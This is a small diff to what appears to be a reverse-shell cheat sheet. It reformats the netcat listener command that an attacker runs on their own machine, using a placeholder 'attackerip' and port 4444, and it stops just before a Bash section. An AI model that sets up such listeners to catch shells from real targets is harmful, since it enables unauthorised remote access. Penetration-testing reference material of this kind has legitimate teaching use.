@@ -11,7 +11,7 @@ Your options for creating a reverse shell are limited by the scripting languages
 
 💡💡💡  First of all, on your machine, set up a listener, where **`attackerip`** is your IP address and **`4444`** is an arbitrary TCP port unfiltered by the target's firewall:
 ```bash
-attacker$ nc -l -v attackerip 4444
+nc -lv attackerip 4444
 ```
 
 ## Bash
